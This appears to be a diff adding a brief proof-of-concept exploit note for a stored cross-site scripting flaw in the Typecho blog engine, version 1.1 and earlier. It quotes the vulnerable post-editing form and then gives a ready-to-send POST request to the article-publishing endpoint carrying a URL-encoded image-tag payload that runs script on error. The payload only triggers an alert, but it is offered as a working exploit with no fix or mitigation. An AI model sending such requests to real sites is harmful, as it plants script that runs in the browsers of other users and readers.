@@ -1,0 +1,24 @@
+# By 李在堂
+
+'''
+Log in to the background page, write a new article, you can add payload in the article content, resulting in XSS
+	Source:
+		write-post.php:11-14
+
+			<form action="<?php $security->index('/action/contents-post-edit'); ?>" method="post"name="write_post">
+				<div class="col-mb-12 col-tb-9" role="main">
+   			        <?php if ($post->draft && $post->draft['cid'] != $post->cid): ?>
+				<?php $postModifyDate = new Typecho_Date($post->draft['modified']); ?>
+
+	Affected software:typecho <=1.1
+	Software Link: https://github.com/typecho/typecho
+
+'''
+
+exploit:
+127.0.0.1/index.php/action/contents-post-edit
+POST 
+title=XSS1&text=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&fieldNames%5B%5D=&fieldTypes%5B%5D=str&fieldValues%5B%5D=&cid=&do=publish&markdown=1&date=&tags=&visibility=publish&password=&allowComment=1&allowPing=1&allowFeed=1&trackback=
+
+
+
